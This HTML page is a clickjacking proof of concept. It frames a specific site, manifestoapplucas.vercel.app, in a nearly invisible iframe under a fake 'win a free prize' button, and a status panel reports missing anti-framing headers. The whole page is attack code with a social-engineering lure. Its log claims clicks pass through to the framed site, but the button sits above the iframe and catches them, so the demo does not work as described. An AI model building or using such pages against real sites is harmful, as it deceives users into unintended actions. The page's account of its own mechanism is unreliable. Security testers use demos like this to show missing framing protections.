<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC — Demo Profissional</title>
<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #0d0d0d;
    color: #eaeaea;
  }

  header {
    padding: 20px;
    border-bottom: 1px solid #222;
    display: flex;
    justify-content: space-between;
  }

  h1 {
    margin: 0;
    font-size: 20px;
  }

  .container {
    display: grid;
    grid-template-columns: 1fr 320px;
    height: calc(100vh - 60px);
  }

  .attack-area {
    position: relative;
    background: black;
  }

  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: none;
    opacity: 0.02; /* invisível */
    z-index: 1;
  }

  .fake-button {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    padding: 20px 40px;
    background: #ff3b3b;
    color: white;
    font-size: 18px;
    border: none;
    cursor: pointer;
    z-index: 2;
  }

  .panel {
    border-left: 1px solid #222;
    padding: 20px;
  }

  .status {
    margin-bottom: 15px;
    font-size: 14px;
  }

  .log {
    background: #111;
    padding: 10px;
    height: 200px;
    overflow-y: auto;
    font-size: 12px;
  }

  .log div {
    margin-bottom: 5px;
  }

  button.ctrl {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    background: #1a1a1a;
    border: 1px solid #333;
    color: white;
    cursor: pointer;
  }

  button.ctrl:hover {
    border-color: red;
  }
</style>
</head>
<body>

<header>
  <h1>Clickjacking PoC</h1>
  <span>Status: <b style="color:red">Vulnerável</b></span>
</header>

<div class="container">

  <div class="attack-area">
    <!-- iframe real -->
    <iframe id="targetFrame" src="https://manifestoapplucas.vercel.app"></iframe>

    <!-- botão fake -->
    <button class="fake-button" onclick="clicked()">
      🎁 Ganhar prêmio grátis
    </button>
  </div>

  <div class="panel">
    <div class="status">X-Frame-Options: <b style="color:red">AUSENTE</b></div>
    <div class="status">CSP frame-ancestors: <b style="color:red">AUSENTE</b></div>

    <button class="ctrl" onclick="toggleOpacity()">Toggle Opacidade</button>
    <button class="ctrl" onclick="changeTarget()">Trocar Target</button>

    <div class="log" id="log"></div>
  </div>

</div>

<script>
let visible = false;
let targets = [
  "https://manifestoapplucas.vercel.app",
  "https://manifestoapplucas.vercel.app",
  "https://manifestoapplucas.vercel.app"
];
let index = 0;

function log(msg) {
  const el = document.getElementById('log');
  const div = document.createElement('div');
  div.textContent = new Date().toLocaleTimeString() + " - " + msg;
  el.prepend(div);
}

function clicked() {
  log("Usuário clicou no botão fake (clique atravessou para iframe)");
  alert("Clique capturado!\nNa vida real isso executaria uma ação no site alvo.");
}

function toggleOpacity() {
  const iframe = document.getElementById('targetFrame');
  visible = !visible;
  iframe.style.opacity = visible ? "0.2" : "0.02";
  log("Opacidade alterada");
}

function changeTarget() {
  index = (index + 1) % targets.length;
  document.getElementById('targetFrame').src = targets[index];
  log("Target alterado: " + targets[index]);
}

log("PoC iniciado");
</script>

</body>
</html>
